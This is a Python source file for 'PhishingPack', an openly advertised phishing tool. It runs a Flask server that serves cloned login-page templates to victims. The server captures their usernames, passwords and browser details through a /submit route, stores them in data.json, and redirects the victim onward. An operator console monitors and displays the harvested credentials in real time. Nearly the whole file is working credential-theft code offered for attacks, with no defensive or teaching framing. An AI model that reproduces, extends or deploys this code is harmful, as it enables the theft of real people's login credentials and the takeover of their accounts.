from os import system, name, path
from rich.console import Console
from pyfiglet import figlet_format
from flask import Flask, render_template, request
from time import sleep
from json import dump, load
import os
from multiprocessing import Process
import atexit
from shutil import copy2
from threading import Thread
from socket import gethostbyname, gethostname
from contextlib import redirect_stdout, redirect_stderr

console = Console(force_terminal=True)
app = Flask(__name__)

hostname = gethostname()
ip_address = gethostbyname(hostname)
PORT = 5150

help_string = """
[bright_blue]Help usage for PhishingPack![/bright_blue]
[bright_blue]============================[/bright_blue]

[yellow1]PhishingPack is a powerful phishing tool that makes it easy to perform phishing attacks.[/yellow1]
[yellow3]Type 'exit' or press Ctrl+C to quit the program.[/yellow3]



[bright_white]Commands list:[/bright_white]
[bright_white]--------------[/bright_white]

[magenta2]--> server start[/magenta2]: Start the phishing webserver for the selected site template.

[magenta2]--> server stop[/magenta2]: Stops the currently running webserver if any.

[magenta2]--> server status[/magenta2]: Tells if the webserver is running or not.

[magenta2]--> server monitor[/magenta2]: Monitor the currently running webserver for data from the victom.

[magenta2]--> data display[/magenta2]: Display the data collected by the phishing webserver.

[magenta2]--> data clear[/magenta2]: Clear the data collected by the phishing webserver.

[magenta2]--> help[/magenta2]: Display this help message.

[magenta2]--> clear[/magenta2]: Clear the console.

[magenta2]--> exit[/magenta2]: Quit the program.


For individual command assistance, type 'help COMMAND'.

"""


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/submit", methods=["POST"])
def submit():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        user_agent = request.form["user_agent"]
        time = request.form["time"]

        all_data = get_all_data()
        data_to_save = {
            "site": get_current_site(),
            "user_agent": user_agent,
            "time": time,
            "username": username,
            "password": password,
        }
        all_data.append(data_to_save)
        set_new_data(True)
        set_latest_data(data_to_save)

        with open("data.json", "w") as f:
            dump(all_data, f)

        current_site = get_current_site()
        site = get_site_from_name(current_site)
        return site["redirect_to"]


def all_sites_string():
    i = 1

    console.print(
        "\n\nChoose one of the following site template to start the server:\n",
        style="bright_yellow",
    )
    all_sites = get_all_sites()
    for site in all_sites:
        console.print(f"{i}. {site['name']}", style="sea_green1")
        i += 1


def get_all_data():
    with open("data.json", "r") as f:
        return load(f)


def get_all_sites():
    with open("config/sites.json", "r") as f:
        return load(f)


def get_site_from_name(name):
    all_sites = get_all_sites()
    for site in all_sites:
        if site["name"] == name:
            return site


def load_logs():
    with open("logs", "r") as f:
        return load(f)


def save_logs(data):
    with open("logs", "w") as f:
        dump(data, f)


def get_current_site():
    return load_logs()["current_site"]


def set_current_site(site):
    data = load_logs()
    data["current_site"] = site
    save_logs(data)


def get_monitor():
    return load_logs()["monitor"]


def set_monitor(arg):
    data = load_logs()
    data["monitor"] = arg
    save_logs(data)


def get_new_data():
    return load_logs()["new_data"]


def set_new_data(arg):
    data = load_logs()
    data["new_data"] = arg
    save_logs(data)


def get_latest_data():
    return load_logs()["latest_data"]


def set_latest_data(arg):
    data = load_logs()
    data["latest_data"] = arg
    save_logs(data)


def start_flask_server():
    with open(os.devnull, "w") as null:
        with redirect_stdout(null), redirect_stderr(null):
            app.run(host="0.0.0.0", port=PORT, debug=False)


def stop_flask_server():
    if server_process.is_alive():
        server_process.terminate()


def setSiteTemplate(site_name):
    site = get_site_from_name(site_name)
    source = f"templates/{site['template']}"
    dest = "templates/index.html"

    with open("templates/index.html", "w") as _f:
        pass
    copy2(source, dest)


def clear_console():
    if name == "nt":
        system("cls")
    else:
        system("clear")


def typing_animation(text, style="", sleep_time=0.05):
    for char in text:
        console.print(char, end="", style=style)
        sleep(sleep_time)
    print()


def monitor_data():
    set_latest_data({})
    set_new_data(False)

    while True:
        if not get_monitor():
            break
        sleep(1)
        if get_new_data():
            console.print("\nGot new data!", style="yellow1 bold")
            print(f"Site={get_latest_data()['site']}")
            print(f"UserAgent={get_latest_data()['user_agent']}")
            print(f"Time={get_latest_data()['time']}")
            print(f"username={get_latest_data()['username']}")
            print(f"password={get_latest_data()['password']}")
            print("\n")
            set_new_data(False)
            set_latest_data({})


def display_data():
    all_data = get_all_data()
    if len(all_data) == 0:
        console.print("\nNo data has been collected yet.\n", style="red")
    else:
        console.print("\nDisplay all collected data:\n", style="yellow1 bold")
        for data in all_data:
            print(f"Site={data['site']}")
            print(f"UserAgent={data['user_agent']}")
            print(f"Time={data['time']}")
            print(f"username={data['username']}")
            print(f"password={data['password']}")
            print("\n")


def check_for_files():
    try:
        with open("data.json", "r") as f:
            load(f)
    except:
        console.print("\nInvalid data.json file.", style="red")
        console.print("Please check the file and try again.", style="yellow bold")
        exit()

    try:
        with open("config/sites.json", "r") as f:
            load(f)
    except:
        console.print("\nInvalid sites.json file.", style="red")
        console.print("Please check the file and try again.", style="yellow bold")
        exit()


def main():
    global server_process
    atexit.register(stop_flask_server)

    while True:
        console.print("PhishingPack >", style="bold spring_green2 underline", end="")
        command = input(" ")

        if command.strip() == "":
            continue
        elif command == "clear":
            clear_console()
        elif command == "exit":
            print("\n")
            typing_animation(
                "Exiting PhishingPack...", style="red bold", sleep_time=0.05
            )
            typing_animation(
                "Thank you for using PhishingPack.", sleep_time=0.01, style="bold green"
            )
            break
        elif command == "help":
            console.print(help_string)
        elif command == "server start":
            if server_process.is_alive():
                console.print("\nThe server is already running.\n", style="red")
            else:
                all_sites_string()
                all_sites = get_all_sites()

                site_input = input("\nSelect the site template: ")
                if not site_input.isdigit() or int(site_input) > len(all_sites):
                    console.print("\nInvalid template selection.\n", style="red")
                else:
                    site = all_sites[int(site_input) - 1]["name"]

                    set_current_site(site)
                    setSiteTemplate(site)
                    server_process = Process(target=start_flask_server)
                    server_process.start()
                    console.print(f"\nServer has started for {site} at", style="green")
                    console.log(f"http://127.0.0.1:{PORT}", style="light_sea_green")
                    console.log(f"http://{ip_address}:{PORT}", style="light_sea_green")
                    print("\n\n")

        elif command == "server stop":
            if server_process.is_alive():
                server_process.terminate()
                set_current_site("")
                console.print("\nThe server has been terminated.\n", style="green")
            else:
                console.print("\nThe server is not running.\n", style="red")
        elif command == "server status":
            if server_process.is_alive():
                console.print(
                    f"\nThe server is running for {get_current_site()} phishing site.\n",
                    style="spring_green2 bold",
                )
            else:
                console.print("\nThe server is not running.\n", style="yellow2 bold")
        elif command == "server monitor":
            if server_process.is_alive():
                clear_console()
                console.print(
                    f"\nMonitoring {get_current_site()} phishing site...",
                    style="dodger_blue2",
                )
                console.print(
                    "\nLooking for data from the site...", style="dodger_blue2"
                )
                console.print("Type 'q' to quit.\n", style="green")
                set_monitor(True)
                Thread(target=monitor_data, daemon=True).start()
                while True:
                    inp = input("")
                    if inp == "q":
                        clear_console()
                        set_monitor(False)
                        set_new_data(False)
                        set_latest_data({})
                        console.print(
                            "\nStopped monitoring the server.\n", style="green"
                        )
                        break
            else:
                console.print("\nThe server is not running.\n", style="red")
        elif command == "data display":
            display_data()
        elif command == "data clear":
            with open("data.json", "w") as f:
                dump([], f)
            console.print("\nData has been cleared.\n", style="green")
        else:
            console.print("\nCommand not found. Type 'help' for help.\n", style="red")

    stop_flask_server()


def start():
    clear_console()

    print("\n")
    text = figlet_format("PhishingPack", font="big")
    typing_animation(text, sleep_time=0.005, style="sea_green2 bold")
    print("\n")
    console.print(
        "PhishingPack developed by ByteEncrypt.",
        style="bold royal_blue1",
    )
    console.print(
        "PhishingPack is the only great phishing tool that offers a wide range of versatility for phishing attacks.",
        style="royal_blue1",
    )
    console.print(
        "Use 'help' for help and usage.",
        style="light_sea_green",
    )
    print("\n")

    try:
        main()
    except:
        console.print("\n\nPhishingPack Interrupted!", style="red")


if __name__ == "__main__":
    # Creating logs file
    with open("logs", "w") as f:
        dump(
            {
                "current_site": "",
                "monitor": False,
                "new_data": False,
                "latest_data": {},
            },
            f,
        )

    # Creating data file if not exist
    if not path.exists("data.json"):
        with open("data.json", "w") as f:
            dump([], f)

    check_for_files()

    server_process = Process(target=start_flask_server)
    start()
